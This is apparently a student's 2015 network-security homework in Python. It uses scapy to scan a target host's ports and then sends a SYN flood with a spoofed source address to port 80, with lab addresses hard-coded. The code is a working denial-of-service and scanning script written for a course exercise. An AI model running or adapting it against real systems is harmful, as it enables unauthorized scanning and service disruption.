#!/usr/bin/env python

#HW #: HW 8(TcpAttack) (ECE 404 Spring 2015)
#Name: Sthitapragyan Parida
#ECN Login: sparida
#Due Date: 3/26/2015

import socket
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

class TcpAttack:
	
	# Constructor to assign spoof and target ip
	def __init__(self, spoof_ip, target_ip):
		self.spoof_ip = spoof_ip
		self.target_ip = target_ip
	
	# Scans target ip for open ports within range
	def scanTarget(self, rangeStart, rangeEnd):
		fp = open("openports.txt", "w")
		for pi in range(rangeStart, rangeEnd):
			# Calls isPortOpen to test for open ports
			if self.isPortOpen(self.target_ip, pi):
				# Writes open ports numbers to openports.txt
				fp.write(str(pi) + '\n')
				#print pi
		fp.close()

	# Checks if port is open by trying to onnect to port using python sockets
	def isPortOpen(self, target_ip, pi):
		# Creates TCP Socket
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			target_name = socket.gethostbyaddr(target_ip)
			s.settimeout(0.1)
			s.connect((target_name[0], pi))
			return True
		except Exception as e:
			return False
	
	# Attacks target IP at gven port using a SYN Flood Attack with 1000 syn packets
	def attackTarget(self, port):
		# If port is open, complete SYN Flood attack and return 1. else return 0
		if self.isPortOpen(self.target_ip, port):
			# Simulate SYN Flood with 100 packets
			for i in range(1, 100):
				# Create IP/TCP Packet with SYN flag set
				ip_pck = IP(src = self.spoof_ip, dst = self.target_ip)
				tcp_pck = TCP(sport=RandShort(), dport=port, flags="S")
				packet = ip_pck/tcp_pck
				SYN = 0x02
				F = packet['TCP'].flags
				# If SYN flag is set send packet out
				if F & SYN:
					send(packet, verbose = False)
			return 1
		else:
			return 0
def main():
	tcp = TcpAttack("10.161.15.27", "10.161.15.29")
	print "Scanning Target for ports..."
	tcp.scanTarget(0, 500)
	print "Writing open port numbers to openports.txt.."
	print "Port Scan Complete"
	print "Attack Initiated..."
	if tcp.attackTarget(80):
		print "Attack Completed"
	else:
		print "Attack cannot be completed due to unavailable port"

if __name__ == "__main__":
	main()

		
